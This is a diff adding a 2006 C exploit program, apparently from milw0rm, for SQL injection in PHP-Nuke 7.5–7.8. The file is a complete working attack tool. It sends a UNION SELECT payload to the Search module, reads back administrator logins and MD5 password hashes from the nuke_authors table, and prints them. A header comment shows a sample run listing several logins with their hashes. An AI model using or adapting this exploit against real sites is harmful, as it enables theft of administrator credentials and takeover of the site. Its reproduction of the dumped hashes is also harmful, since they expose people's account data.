@@ -1,0 +1,269 @@
+/*
+                  ____   ____    __
+|    |     |     |    | |    |  /
+|    |     |     |    | |___/   \
+|    | --- |     |----| |   \    \
+|____|     |____ |    | |____| __/
+
+Copyright (C) 2006 Untruth Labs
+
+Critical sql injection in phpNuke 7.5-7.8 Exploit
+coded by unitedbr
+
+greetz: paulin, barros, xgc
+
+found by Janek Vind "waraxe"
+Original advisory: http://www.waraxe.us/advisory-46.html
+
+-------------------------------------------------------------------------------
+
+compiled in VC++
+
+C:\@Pastinha\Area_de_Testes\cpp\phpnuke75to78>cl phpnuke75to78.cpp
+Microsoft (R) 32-bit C/C++ Optimizing Compiler Version 12.00.8168 for 80x86
+Copyright (C) Microsoft Corp 1984-1998. All rights reserved.
+
+phpnuke75to78.cpp
+Microsoft (R) Incremental Linker Version 6.00.8168
+Copyright (C) Microsoft Corp 1992-1998. All rights reserved.
+
+/out:phpnuke75to78.exe
+phpnuke75to78.obj
+
+C:\@Pastinha\Area_de_Testes\cpp\phpnuke75to78>
+
+-------------------------------------------------------------------------------
+
+Exploit:
+
+C:\@Pastinha\Area_de_Testes\cpp\phpnuke75to78>phpnuke75to78 127.0.0.1 /phpnuke75to78/
+                  ____   ____    __
+|    |     |     |    | |    |  /
+|    |     |     |    | |___/   \
+|    | --- |     |----| |   \    \
+|____|     |____ |    | |____| __/
+
+
+[~] Sending sql injection...
+[~] Connected and exploiting...
+[~] Trying to get the md5 passwords...
+
+
+--[ md5 hash passwords
+
+login: unitedbr
+md5 password: 85a2b752c8686ac935765bb8f2c10fe7
+
+login: psy0x
+md5 password: 75d690bc3c8598371af11bf1796696f0
+
+login: paulin
+md5 password: 2bdfb3cbc500bcc4ea4e6a524487eb4c
+
+login: poerschke
+md5 password: 5dab98907b1d8db82172944c52404fcd
+
+login: uNfz
+md5 password: 254fa93505554fbfee98d018fd80803a
+
+login: Coloss
+md5 password: a89de668ffb6504172a7df7e2abce403
+
+login: skotch
+md5 password: 0ef9fb24ae1af6d0a397dc60dc0f87d2
+
+C:\@Pastinha\Area_de_Testes\cpp\phpnuke75to78>
+
+
+*/
+
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#pragma comment(lib, "ws2_32.lib")
+#include <winsock2.h>
+
+#define PORT 80
+#define BUFLEN 10000
+#define DATA "query=p0hh0nsee%') UNION ALL SELECT 1,2,aid,pwd,5,6,7,8,9,10 FROM nuke_authors/*" // */ */
+#define U "                  ____   ____    __ \n"
+#define L "|    |     |     |    | |    |  /   \n"
+#define A "|    |     |     |    | |___/   \\   \n"
+#define B "|    | --- |     |----| |   \\    \\ \n"
+#define S "|____|     |____ |    | |____| __/  \n\n"
+
+void usage(char *argv[]);
+void sqlinj(char *host, char *dir);
+char *md5pass(char *buffer, char *s, bool test);
+
+int main(int argc, char *argv[])
+{   
+     if( argc != 3 )
+     {
+         usage(argv);
+         exit(EXIT_FAILURE);
+     }
+     
+     printf(U L A B S);
+     printf("\n");
+     printf("[~] Sending sql injection...\n");
+     sqlinj(argv[1], argv[2]);
+    
+     return 0;
+}
+
+void usage(char *argv[])
+{
+     printf("\n##############################################\n");
+     printf("#                                            #\n");
+     printf("#             [ Untruth Labs ]               #\n");
+     printf("#                                            #\n");
+     printf("#                 presents                   #\n");
+     printf("#                                            #\n");
+     printf("#     PHP-Nuke 7.5 to 7.8 sql injection      #\n");
+     printf("#                                            #\n");
+     printf("#                          coded by unitedbr #\n");
+     printf("##############################################\n\n");
+     printf("Usage:\n"
+            "%s [target] [dir]\n\n"
+            "Example:\n"
+            "%s www.target.com /dir/\n"
+            "%s www.target.com /\n", argv[0], argv[0], argv[0]);
+
+     exit(EXIT_SUCCESS);
+}
+
+void sqlinj(char *host, char *dir)
+{
+     char buffer[BUFLEN];
+     sprintf( buffer, "POST %smodules.php?name=Search HTTP/1.0\n"
+                      "Host: %s\n"
+                      "Content-Type: application/x-www-form-urlencoded\n"
+                      "Content-Length: %d\n\n%s\n\n\n", dir, host, strlen(DATA), DATA);
+     
+     WSADATA wsaData;
+    
+     /* Winsock start up */
+     int iResult = WSAStartup( MAKEWORD(2,2), &wsaData );
+     if ( iResult != NO_ERROR )
+     {
+          printf("\n[-] Error at WSAStartup()\n");
+          exit(EXIT_FAILURE);
+     }
+     
+     /* Create socket */
+     SOCKET my_sock;
+     my_sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
+    
+     if( my_sock == INVALID_SOCKET )
+     {
+         printf("\n[-] Error creating socket: %ld\n", WSAGetLastError() );
+         WSACleanup();
+         exit(EXIT_FAILURE);
+     }
+    
+     struct hostent *he;
+     struct sockaddr_in addr;
+    
+     /* getting the ip address */
+     he = gethostbyname(host);
+     if( he == NULL )
+     {
+         printf("\n[-] Can't resolve ip address \"%s\"\n", host);
+         exit(EXIT_FAILURE);
+     }
+    
+     memset(&addr, 0, sizeof(addr));
+     memcpy((char*)&addr.sin_addr, he->h_addr, he->h_length);
+     addr.sin_family = AF_INET;
+     addr.sin_port = htons(PORT);
+    
+     /* connecting */
+     if( connect(my_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+     {
+          printf("\n[-] Can't connect to %s\n", host);
+          WSACleanup();
+          exit(EXIT_FAILURE);
+     }
+     
+     printf("[~] Connected and exploiting...\n");
+     
+     if( send(my_sock, buffer, sizeof(buffer), 0) < 0 )
+     {
+          printf("\n[-] Can't send socket...\n");
+          exit(EXIT_FAILURE);
+     }
+     
+     memset(buffer,0, sizeof(buffer));
+     
+     char *s = NULL;
+     bool test = false, onetime = true;
+     
+     printf("[~] Trying to get the md5 passwords...\n\n");
+
+     while( recv(my_sock, buffer, sizeof(buffer), 0) )
+     {
+         while( (s = strstr(buffer, "article&sid=1\"><b>")) != NULL )
+         {
+             test = true;
+             s = md5pass(buffer, s, onetime);
+             onetime = false;
+         }
+     }
+     
+     if(!test)
+         printf("Oooopz... Can't find md5 passwords :\\\n");
+     
+     WSACleanup();
+     closesocket(my_sock);
+}
+
+char *md5pass(char *buffer, char *s, bool onetime)
+{
+     int pos = 0, pos1 = 0, pos2 = 0;
+     int i = 0, j = 0;
+     char *str = NULL;
+     
+     if(onetime)
+         printf("\n--[ md5 hash passwords\n\n");
+     
+     if( (s = strstr(buffer, "amp;username=")) != NULL )
+     {
+         if( (str = strstr(s, "\">")) != NULL )
+         {
+             pos1 = str - s + 1;
+         }
+         printf("login: ");
+         for(i = 13; i < pos1-1; i++)
+         {
+             printf("%c", s[i]);
+         }
+             
+         printf("\n");
+     }
+     if( (s = strstr(buffer, "article&sid=1\"><b>")) != NULL )
+     {
+         if( (str = strstr(s, "</b>")) != NULL )
+         {
+             pos2 = str - s + 1;
+         }
+         printf("md5 password: ");
+         for(i = 18; i < pos2-1; i++)
+         {
+             printf("%c", s[i]);
+         }
+             
+         printf("\n\n");
+     }
+     
+     //printf("\npos2 = %d\n", pos2);
+     
+     for(i = 0, j = 260; s[i] != NULL; i++, j++)
+     {
+         s[i] = s[j];
+     }
+             
+     return s;
+}
+
+// milw0rm.com [2006-02-23]
